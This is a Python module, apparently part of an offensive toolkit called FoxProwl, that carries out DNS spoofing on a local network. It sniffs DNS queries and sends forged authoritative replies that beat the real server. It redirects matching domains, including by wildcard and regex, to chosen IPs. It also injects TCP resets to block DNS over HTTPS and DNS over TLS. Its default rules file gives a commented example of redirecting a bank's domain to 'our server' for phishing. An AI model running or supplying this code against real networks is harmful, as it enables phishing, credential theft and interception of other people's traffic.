"""
modules/dns_spoof.py
DNS Spoofer Ultra-Complet.
- Support wildcards (*.domain.com)
- Support regex (regex:.*porn.*)
- Réponse ultra-rapide (avant le vrai serveur DNS)
- Support A, AAAA, CNAME
- Blocage DNS over HTTPS/TLS
- Interface avec fichier hosts enrichi
"""
import os
import re
import time
import threading
from typing import Dict, List, Tuple, Optional, Pattern
from dataclasses import dataclass, field

from scapy.all import (
    sniff, send, sendp, IP, UDP, TCP, DNS, DNSQR, DNSRR, Ether,
    DNSRROPT
)

from core.logger import log
from core.config import conf, attack_conf
from core.utils import Counter


@dataclass
class DNSRule:
    """Règle de spoofing DNS."""
    pattern: str           # Pattern original (*.domain.com, regex:..., etc.)
    redirect_ip: str       # IP vers laquelle rediriger
    is_regex: bool = False # Si True, le pattern est une regex
    is_wildcard: bool = False
    _compiled: Optional[Pattern] = field(default=None, repr=False)
    
    def __post_init__(self):
        """Compile le pattern si nécessaire."""
        if self.pattern.startswith("regex:"):
            self.is_regex = True
            regex_pattern = self.pattern[6:]
            try:
                self._compiled = re.compile(regex_pattern, re.IGNORECASE)
            except re.error:
                log.warning(f"Regex invalide: {regex_pattern}")
        elif "*" in self.pattern:
            self.is_wildcard = True
            # Convertir le wildcard en regex
            regex_pattern = self.pattern.replace(".", r"\.").replace("*", ".*")
            self._compiled = re.compile(f"^{regex_pattern}$", re.IGNORECASE)
    
    def matches(self, domain: str) -> bool:
        """Vérifie si un domaine correspond à cette règle."""
        domain = domain.lower().rstrip(".")
        pattern = self.pattern.lower().rstrip(".")
        
        if self.is_regex and self._compiled:
            return bool(self._compiled.search(domain))
        elif self.is_wildcard and self._compiled:
            return bool(self._compiled.match(domain))
        else:
            # Match exact
            return domain == pattern or domain == f"www.{pattern}"


class DNSSpoofer:
    """
    DNS Spoofer professionnel.
    
    Intercepte les requêtes DNS et répond avec des IPs falsifiées
    AVANT le vrai serveur DNS.
    
    Format du fichier hosts (data/hosts.txt):
        # Commentaire
        192.168.1.100   facebook.com
        192.168.1.100   *.facebook.com
        192.168.1.200   regex:.*(porn|xxx|adult).*
    """
    
    def __init__(
        self,
        hosts_file: str = "data/hosts.txt",
        default_redirect: str = None,
        block_doh: bool = True
    ):
        """
        :param hosts_file: Fichier de règles DNS
        :param default_redirect: IP par défaut pour les domaines non listés (None = pas de redirection)
        :param block_doh: Si True, bloque DNS over HTTPS (port 443 vers DNS connus)
        """
        self.hosts_file = hosts_file
        self.default_redirect = default_redirect
        self.block_doh = block_doh
        
        # Règles de spoofing
        self.rules: List[DNSRule] = []
        
        # IPs des serveurs DoH/DoT connus
        self.doh_servers = {
            "8.8.8.8", "8.8.4.4",      # Google
            "1.1.1.1", "1.0.0.1",      # Cloudflare
            "9.9.9.9",                  # Quad9
            "208.67.222.222",           # OpenDNS
            "208.67.220.220"
        }
        
        # État
        self.running = False
        self._thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()
        
        # Stats
        self.queries_spoofed = Counter()
        self.queries_passed = Counter()
        self.doh_blocked = Counter()
        self.start_time: float = 0.0
        
        # Charger les règles
        self._load_rules()
    
    def _load_rules(self):
        """Charge les règles depuis le fichier hosts."""
        if not os.path.exists(self.hosts_file):
            log.warning(f"Fichier {self.hosts_file} non trouvé, création d'un modèle...")
            self._create_default_hosts()
            return
        
        count = 0
        try:
            with open(self.hosts_file, "r", encoding="utf-8") as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    
                    # Ignorer commentaires et lignes vides
                    if not line or line.startswith("#"):
                        continue
                    
                    # Supprimer commentaires inline
                    if "#" in line:
                        line = line.split("#")[0].strip()
                    
                    parts = line.split()
                    if len(parts) >= 2:
                        ip = parts[0]
                        domain = parts[1]
                        
                        rule = DNSRule(pattern=domain, redirect_ip=ip)
                        self.rules.append(rule)
                        count += 1
            
            log.info(f"DNS Spoof: {count} règle(s) chargée(s) depuis {self.hosts_file}")
        
        except Exception as e:
            log.error(f"Erreur lecture {self.hosts_file}: {e}")
    
    def _create_default_hosts(self):
        """Crée un fichier hosts par défaut."""
        os.makedirs(os.path.dirname(self.hosts_file), exist_ok=True)
        
        default_content = """# FoxProwl DNS Spoofing Rules
# Format: IP_REDIRECT   DOMAINE
# Supports:
#   - Exact match: facebook.com
#   - Wildcards: *.facebook.com
#   - Regex: regex:.*(porn|xxx).*

# Exemples:
# 192.168.1.100   facebook.com
# 192.168.1.100   *.facebook.com
# 192.168.1.200   regex:.*(porn|adult|xxx).*

# Phishing example (redirect bank to our server):
# 192.168.1.100   bankofamerica.com
# 192.168.1.100   *.bankofamerica.com
"""
        try:
            with open(self.hosts_file, "w", encoding="utf-8") as f:
                f.write(default_content)
            log.info(f"Fichier modèle créé: {self.hosts_file}")
        except Exception as e:
            log.error(f"Impossible de créer {self.hosts_file}: {e}")
    
    def add_rule(self, domain: str, redirect_ip: str):
        """Ajoute une règle de spoofing à chaud."""
        rule = DNSRule(pattern=domain, redirect_ip=redirect_ip)
        with self._lock:
            self.rules.append(rule)
        log.info(f"Règle DNS ajoutée: {domain} → {redirect_ip}")
    
    def _find_redirect(self, domain: str) -> Optional[str]:
        """Trouve l'IP de redirection pour un domaine."""
        domain = domain.lower().rstrip(".")
        
        with self._lock:
            for rule in self.rules:
                if rule.matches(domain):
                    return rule.redirect_ip
        
        # Redirect par défaut si configuré
        return self.default_redirect
    
    def _forge_dns_response(self, pkt, redirect_ip: str) -> None:
        """Forge et envoie une réponse DNS falsifiée."""
        try:
            query_name = pkt[DNS].qd.qname
            query_type = pkt[DNS].qd.qtype
            
            # Construire la réponse selon le type de requête
            if query_type == 1:  # A record (IPv4)
                answer = DNSRR(
                    rrname=query_name,
                    type=1,
                    ttl=attack_conf.DNS_TTL,
                    rdata=redirect_ip
                )
            elif query_type == 28:  # AAAA record (IPv6)
                # On répond avec une IP v4 quand même ou on ignore
                # Pour simplifier, on répond "pas de record AAAA"
                answer = None
            else:
                # Autres types (CNAME, MX, etc.) - on ignore pour l'instant
                return
            
            # Construire le paquet de réponse
            if answer:
                spoofed_dns = DNS(
                    id=pkt[DNS].id,
                    qr=1,      # Response
                    aa=1,      # Authoritative
                    rd=pkt[DNS].rd,
                    ra=1,      # Recursion available
                    qd=pkt[DNS].qd,
                    an=answer,
                    ancount=1
                )
            else:
                # Réponse vide (NXDOMAIN ou no records)
                spoofed_dns = DNS(
                    id=pkt[DNS].id,
                    qr=1,
                    aa=1,
                    rd=pkt[DNS].rd,
                    ra=1,
                    rcode=0,  # No error mais pas de réponse
                    qd=pkt[DNS].qd,
                    ancount=0
                )
            
            # Construire le paquet IP/UDP
            # On inverse src/dst
            spoofed_pkt = (
                IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
                spoofed_dns
            )
            
            # Envoyer IMMÉDIATEMENT (course contre le vrai serveur DNS)
            send(spoofed_pkt, verbose=False, iface=conf.interface)
            
            self.queries_spoofed.increment()
            
            if self.queries_spoofed.value % 5 == 0:
                domain_str = query_name.decode() if isinstance(query_name, bytes) else query_name
                log.attack(f"DNS Spoof: {domain_str} → {redirect_ip}")
        
        except Exception as e:
            log.warning(f"Erreur forge DNS: {e}")
    
    def _handle_packet(self, pkt):
        """Callback pour chaque paquet DNS."""
        # Vérifier que c'est une requête DNS (pas une réponse)
        if not pkt.haslayer(DNS) or not pkt.haslayer(DNSQR):
            return
        
        if pkt[DNS].qr == 1:  # C'est une réponse, pas une requête
            return
        
        # Extraire le nom de domaine demandé
        try:
            query_name = pkt[DNS].qd.qname
            if isinstance(query_name, bytes):
                query_name = query_name.decode()
            query_name = query_name.rstrip(".")
        except Exception:
            return
        
        # Chercher si on doit spoofer ce domaine
        redirect_ip = self._find_redirect(query_name)
        
        if redirect_ip:
            self._forge_dns_response(pkt, redirect_ip)
        else:
            self.queries_passed.increment()
    
    def _handle_doh_blocking(self, pkt):
        """Bloque les tentatives de DNS over HTTPS."""
        if not pkt.haslayer(TCP) or not pkt.haslayer(IP):
            return
        
        dst_ip = pkt[IP].dst
        dst_port = pkt[TCP].dport
        
        # Vérifier si c'est une connexion vers un serveur DoH connu sur port 443 ou 853
        if dst_port in (443, 853) and dst_ip in self.doh_servers:
            # Envoyer un RST pour bloquer
            rst = IP(src=dst_ip, dst=pkt[IP].src) / TCP(
                sport=dst_port,
                dport=pkt[TCP].sport,
                flags="R",
                seq=pkt[TCP].ack
            )
            send(rst, verbose=False, iface=conf.interface)
            self.doh_blocked.increment()
    
    def _sniff_loop(self):
        """Boucle principale de sniffing DNS."""
        # Filtre BPF pour DNS (UDP port 53)
        bpf_filter = "udp port 53"
        
        try:
            sniff(
                iface=conf.interface,
                filter=bpf_filter,
                prn=self._handle_packet,
                stop_filter=lambda x: not self.running,
                store=0
            )
        except Exception as e:
            if self.running:
                log.error(f"Erreur sniff DNS: {e}")
    
    def _doh_block_loop(self):
        """Boucle de blocage DoH/DoT."""
        # Filtre pour les connexions TCP vers les serveurs DoH
        doh_ips = " or ".join(f"dst host {ip}" for ip in list(self.doh_servers)[:5])
        bpf_filter = f"tcp and (port 443 or port 853) and ({doh_ips})"
        
        try:
            sniff(
                iface=conf.interface,
                filter=bpf_filter,
                prn=self._handle_doh_blocking,
                stop_filter=lambda x: not self.running,
                store=0
            )
        except Exception:
            pass
    
    def start(self):
        """Démarre le DNS Spoofing."""
        if self.running:
            return
        
        if not self.rules and not self.default_redirect:
            log.warning("Aucune règle DNS définie! Chargez des règles ou définissez un redirect par défaut.")
        
        self.running = True
        self.start_time = time.time()
        
        # Démarrer le sniff DNS
        self._thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._thread.start()
        
        # Démarrer le blocage DoH si activé
        if self.block_doh:
            doh_thread = threading.Thread(target=self._doh_block_loop, daemon=True)
            doh_thread.start()
        
        log.attack(f"DNS Spoofing actif - {len(self.rules)} règle(s)")
        if self.block_doh:
            log.info("Blocage DNS over HTTPS activé")
    
    def stop(self):
        """Arrête le DNS Spoofing."""
        if not self.running:
            return
        
        self.running = False
        
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3.0)
        
        duration = time.time() - self.start_time
        log.success(
            f"DNS Spoofing arrêté. "
            f"Durée: {duration:.1f}s, "
            f"Spoofed: {self.queries_spoofed.value}, "
            f"Passed: {self.queries_passed.value}, "
            f"DoH blocked: {self.doh_blocked.value}"
        )
    
    def get_stats(self) -> dict:
        """Retourne les statistiques."""
        return {
            "running": self.running,
            "rules": len(self.rules),
            "queries_spoofed": self.queries_spoofed.value,
            "queries_passed": self.queries_passed.value,
            "doh_blocked": self.doh_blocked.value,
            "duration": time.time() - self.start_time if self.start_time else 0
        }
    
    def __enter__(self):
        self.start()
        return self
    
    def __exit__(self, *args):
        self.stop()
        return False